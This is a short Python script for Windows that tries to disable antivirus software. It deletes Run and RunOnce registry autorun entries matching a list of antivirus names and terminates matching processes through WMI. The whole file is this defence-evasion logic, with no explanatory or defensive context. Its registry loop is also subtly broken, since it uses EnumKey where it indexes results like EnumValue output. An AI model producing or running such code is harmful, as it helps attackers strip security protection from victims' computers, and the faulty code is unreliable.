from re import RegexFlag
import winreg,os,wmi,signal
av_list=["av_name"]

reghives=[winreg.HKEY_LOCAL_MACHINE,winreg.HKEY_CURRENT_USER]
regpaths=["SOFTWARE\Microsoft\Windows\CurrentVersion\Run","SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"] #example

for reghive in reghives:
    for regpath in regpaths:
        reg=winreg.ConnectRegistry(None,reghive)
        key=winreg.OpenKey(reg,regpath,0,access=winreg.KEY_READ)
        try:
            index=0
            while True:
                val=winreg.EnumKey(key,index)
                for name in av_list:
                    if name in val[1]:
                        print("Deleting %s Autorun Key" % val[0])
                        key2=winreg.OpenKey(reg,regpath,0,access=winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key2,val[0])

                index += 1
        except OSError:
            {}
f = wmi.WMI()
for process in f.Win32_Process():
    for name in av_list:
        if name in process.Name:
            os.kill(int(process.processId),signal.SIGTERM)


